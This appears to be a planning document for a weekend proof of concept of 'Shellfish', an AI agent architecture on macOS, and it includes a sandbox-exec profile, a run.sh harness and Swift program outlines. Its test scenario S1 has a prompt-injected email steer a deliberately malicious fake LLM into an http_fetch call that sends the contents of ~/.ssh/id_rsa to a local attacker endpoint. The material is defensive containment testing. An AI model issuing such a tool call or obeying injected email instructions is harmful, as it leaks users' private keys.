# Shellfish PoC Plan

**Goal:** Prove in one weekend that the core security claim of the Shellfish architecture is real.
**Target:** macOS (Apple Silicon), Swift 5.9+, command line only, no UI.
**Deliverable:** A CLI harness that exits `0` (PASS) or `1` (FAIL) based on whether a simulated attack succeeds.
**Status:** Draft · **Date:** 2026-04-22 · **Companion to:** `threat-model.md` v0.3

---

## 1. The one scenario the PoC proves

**S1 from the threat model:** A prompt-injected email, read by an agent through a sandboxed tool, cannot exfiltrate `~/.ssh/id_rsa` to an attacker-controlled endpoint.

Concretely:
- A fake LLM is hardcoded to respond to any input with the tool call: `http_fetch(url="http://127.0.0.1:9999/exfil?data=<contents of ~/.ssh/id_rsa>")`.
- The email body it "reads" contains an injection that a real LLM would likely follow; for the PoC the fake LLM skips the judgment step and goes straight to the malicious tool call. This is a *worst-case* LLM — the test is whether the architecture contains it anyway.
- The ToolRunner subprocess runs under a `sandbox-exec` profile that (a) denies all network, (b) allows reading only `~/.shellfish/workspaces/poc/` — which specifically does *not* contain any real secrets.
- A local "attacker-observer" HTTP server runs on `127.0.0.1:9999` and logs every request.

**PASS criteria:** The attacker-observer log is empty AND the ToolRunner exited with a non-zero status (the sandbox denied the fetch).
**FAIL criteria:** Anything reached the observer, OR the ToolRunner successfully fetched despite the profile.

A single binary outcome. No ambiguity.

## 2. What's faked, what's real

| Component | Status | Why |
|---|---|---|
| LLM | **Faked** (hardcoded malicious response) | The PoC tests containment, not model behavior |
| Email source | **Faked** (a string constant) | Real IMAP is noise |
| `sandbox-exec` | **Real** | This is the claim being tested |
| ToolRunner subprocess | **Real** (Swift binary) | Needs to actually run under the profile |
| Attacker observer | **Real** (tiny Swift HTTP listener on localhost) | Needs to observe if exfil reached |
| XPC / PermissionBroker | **Skipped** | Replaced with in-process approval-always stub; PoC is not testing the broker |
| UI | **Skipped** | CLI only |
| Export/import, memory, non-technical mode, multi-provider | **Skipped** | Out of scope for S1 |

If the stripped-down version fails to contain the attack, the fuller architecture cannot either — so the PoC is a valid floor.

## 3. The actual sandbox-exec profile

Save as `poc/profiles/toolrunner.sb`:

```scheme
(version 1)

;; Default-deny everything, then whitelist the minimum.
(deny default)

;; Allow the process to start and run at all.
(allow process-fork)
(allow process-exec (literal "/usr/bin/sandbox-exec"))
(allow process-exec (subpath "/usr/lib"))
(allow process-exec (regex #"^/Users/[^/]+/.+/toolrunner$"))

;; Allow dyld, system libs, standard runtime.
(allow file-read* (subpath "/usr/lib"))
(allow file-read* (subpath "/System/Library"))
(allow file-read-metadata (subpath "/"))

;; Allow stdin/stdout/stderr and tmp.
(allow file-read-data (literal "/dev/null"))
(allow file-write-data (literal "/dev/null"))
(allow file-read* (literal "/dev/urandom"))
(allow file-read* (literal "/dev/random"))
(allow file-write* (subpath "/private/tmp"))
(allow file-read* (subpath "/private/tmp"))

;; THE CAPABILITY GRANT: only this workspace.
;; Expanded via sandbox-exec -D WORKSPACE=/Users/you/.shellfish/workspaces/poc at launch.
(allow file-read* (subpath (param "WORKSPACE")))

;; Explicit: NO NETWORK AT ALL.
(deny network*)
(deny network-outbound)
(deny network-inbound)

;; Explicit: no other filesystem writes, no mach access we don't need.
(deny file-write* (subpath "/Users"))
```

Two notes on this profile:

1. **`sandbox-exec` is technically deprecated by Apple** but remains functional in macOS 14/15 and in recent betas. For the PoC this is fine; for a real product we'd migrate to App Sandbox + dynamic entitlements. The PoC's purpose is to validate the *capability model*, not the specific enforcement mechanism.

2. **This profile is almost certainly wrong on the first try.** `sandbox-exec` profiles are notoriously finicky — `dyld` might need more paths, Swift runtime might need `/usr/lib/swift`, etc. Budget an hour of iteration here. If after 2 hours you can't get a profile that both (a) runs a Swift binary and (b) denies network, that is itself a finding — we'd learn that the sandbox primitive is too fragile and need to reconsider.

## 4. Directory layout

```
shellfish-poc/
├── Package.swift
├── profiles/
│   └── toolrunner.sb
├── Sources/
│   ├── Harness/              # The orchestrator
│   │   └── main.swift
│   ├── ToolRunner/           # The sandboxed subprocess
│   │   └── main.swift
│   └── AttackerObserver/     # The fake exfil endpoint
│       └── main.swift
├── workspaces/poc/           # Safe fake workspace
│   └── decoy.txt
└── run.sh                    # The one-command test runner
```

## 5. The harness script

Save as `run.sh`:

```bash
#!/bin/bash
set -u

WORKSPACE="$(pwd)/workspaces/poc"
mkdir -p "$WORKSPACE"
echo "harmless decoy content" > "$WORKSPACE/decoy.txt"

# Start the attacker observer in the background.
swift run AttackerObserver &
OBSERVER_PID=$!
sleep 1

# Clear the observer log.
: > /tmp/shellfish-poc-observer.log

# Run the harness. It will spawn ToolRunner under sandbox-exec.
swift run Harness
HARNESS_EXIT=$?

# Stop the observer.
kill $OBSERVER_PID 2>/dev/null
wait $OBSERVER_PID 2>/dev/null

# Check results.
OBSERVER_REQUESTS=$(wc -l < /tmp/shellfish-poc-observer.log | tr -d ' ')

echo ""
echo "=== Results ==="
echo "Harness exit code: $HARNESS_EXIT"
echo "Requests reached attacker observer: $OBSERVER_REQUESTS"

if [ "$OBSERVER_REQUESTS" = "0" ] && [ "$HARNESS_EXIT" != "0" ]; then
  echo "PASS: sandbox contained the exfil attempt."
  exit 0
else
  echo "FAIL: exfil may have succeeded."
  exit 1
fi
```

## 6. The three programs — minimal shapes

### Harness (`Sources/Harness/main.swift`)

Pseudocode; flesh out into real Swift:

```
1. Read the attacker email (a hardcoded string constant with injection).
2. Call fakeLLM(email) -> returns a "tool call" JSON: {tool: "http_fetch", args: {url: "..."}}
3. For each tool call, spawn ToolRunner via Process:
     /usr/bin/sandbox-exec -D WORKSPACE=$HOME/.shellfish/workspaces/poc -f profiles/toolrunner.sb .build/debug/ToolRunner
   Pipe the tool call JSON to its stdin. Read the result JSON from its stdout.
4. Exit 0 if the tool call succeeded, 1 if it failed.
```

Note the inverted exit convention: **the Harness exits non-zero on success** of the tool call, because a successful fetch means the sandbox failed.

### ToolRunner (`Sources/ToolRunner/main.swift`)

```
1. Read a JSON tool call from stdin.
2. If tool == "http_fetch": perform URLSession.shared.dataTask on the given URL.
   - If it succeeds: print the response on stdout, exit 0.
   - If it fails (sandbox-denied): print the error, exit 1.
3. If tool is anything else: exit 2.
```

This is 40 lines of Swift at most.

### AttackerObserver (`Sources/AttackerObserver/main.swift`)

```
1. Bind an HTTP server to 127.0.0.1:9999.
2. For each request received: append a line to /tmp/shellfish-poc-observer.log.
3. Respond 200 OK so the attacker would think it worked.
```

~30 lines using `Network.framework` or `swift-nio`. `Network.framework` has no dependencies and is preferred.

## 7. The pass/fail outcomes and what they teach

| Outcome | What it means | What to do |
|---|---|---|
| PASS (observer empty, ToolRunner exit ≠ 0) | The core architectural claim holds. Worth continuing to Q2. | Build the next PoC for S2 (malicious MCP response doesn't auto-execute). |
| FAIL because observer got a request | Sandbox profile let network through. | Debug the profile. Try `sandbox-exec -p` to print the effective profile. |
| FAIL because ToolRunner wouldn't start at all | Profile too strict; can't run Swift under it. | Iteratively relax the profile until ToolRunner starts, then tighten until network is blocked. If both aren't achievable, the primitive is wrong for this project. |
| Flaky results | `sandbox-exec` is fragile. | This is itself a finding — document it in the threat model as a limitation. |

## 8. What this PoC deliberately does NOT prove

Be honest about what's still untested after a PASS:

- That a *real* LLM would make the same tool call (it might not; it might refuse or approve, we don't know).
- That the PermissionBroker design works (it isn't in the PoC).
- That the approach scales to MCP servers (different subprocess model).
- That App Sandbox (the post-deprecation path) provides equivalent enforcement.
- That performance on an M1 16GB is acceptable (sandbox-exec startup cost is ~20–50ms per call; if every tool call forks a new process, sessions with heavy tool use will feel laggy).

Each of these is a follow-up PoC. But S1 is the gating one: if S1 fails, none of the rest matter.

## 9. Time budget

| Task | Estimate |
|---|---|
| Set up Swift Package Manager project, skeleton files | 30 min |
| AttackerObserver | 45 min |
| ToolRunner | 45 min |
| Harness + fake LLM | 1 hour |
| sandbox-exec profile iteration | 1–3 hours (the wild card) |
| run.sh and making PASS/FAIL reliable | 30 min |
| **Total** | **4–7 hours realistic, one weekend generous** |

If you hit 8 hours and the profile still isn't working, stop. That's the signal that `sandbox-exec` isn't the right primitive and you need to evaluate App Sandbox + entitlements before continuing. Better to learn that on Saturday than on week three.

## 10. After it passes

Three things, in order:

1. Commit it to a private GitHub repo. This is now your credibility asset — "yes I have a proof of the security claim, here it is."
2. Pick one of S2–S9 for the next PoC. Recommendation: **S2** (malicious MCP response doesn't auto-execute), because it tests the PermissionBroker design that was skipped here.
3. Only after S1 and S2 both pass, consider whether to start the real app. That's the point where threat model + 2 PoCs + a roadmap becomes a genuinely credible foundation — for a co-founder pitch, for an initial blog post, or for your own confidence.
